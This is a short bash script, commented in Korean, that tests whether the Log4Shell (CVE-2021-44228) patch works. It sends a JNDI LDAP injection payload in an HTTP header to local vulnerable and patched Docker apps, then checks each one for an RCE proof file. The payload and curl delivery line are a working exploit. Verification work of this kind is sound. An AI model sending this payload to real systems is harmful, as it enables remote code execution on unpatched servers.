#!/bin/bash
# CVE-2021-44228 차등 검증 스크립트
# 취약 버전(vulnerable-app)과 패치 버전(patched-app)에 동일한 공격 요청을 보내고
# RCE 재현 여부를 비교한다.

set -e

PAYLOAD='${jndi:ldap://ldap-server:1389/Exploit}'

echo "[INFO] 정상 요청 확인 (vulnerable-app)"
curl -s http://localhost:8080/ && echo

echo "[INFO] 정상 요청 확인 (patched-app)"
curl -s http://localhost:8081/ && echo

echo "[INFO] 공격 요청 전송 - vulnerable-app (log4j 2.14.1)"
curl -s -H "X-Api-Version: ${PAYLOAD}" http://localhost:8080/ > /dev/null

echo "[INFO] 공격 요청 전송 - patched-app (log4j 2.17.1)"
curl -s -H "X-Api-Version: ${PAYLOAD}" http://localhost:8081/ > /dev/null

# JNDI lookup은 비동기로 처리되므로 약간의 대기가 필요하다
sleep 3

echo ""
echo "[INFO] vulnerable-app 내부 RCE 증거 파일 확인"
if docker exec log4shell-vulnerable-app cat /tmp/pwned_by_log4shell.txt 2>/dev/null; then
    echo "[PASS] vulnerable-app: RCE 재현 성공 (예상된 결과)"
else
    echo "[FAIL] vulnerable-app: RCE 재현 실패 (예상과 다름, 환경 점검 필요)"
fi

echo ""
echo "[INFO] patched-app 내부 RCE 증거 파일 확인 (없어야 정상)"
if docker exec log4shell-patched-app cat /tmp/pwned_by_log4shell.txt 2>/dev/null; then
    echo "[FAIL] patched-app: RCE가 재현됨 (예상과 다름, 패치가 무력화됨)"
else
    echo "[PASS] patched-app: RCE 재현되지 않음 (예상된 결과, 패치 정상 동작)"
fi

echo ""
echo "[INFO] 차등 검증 완료"
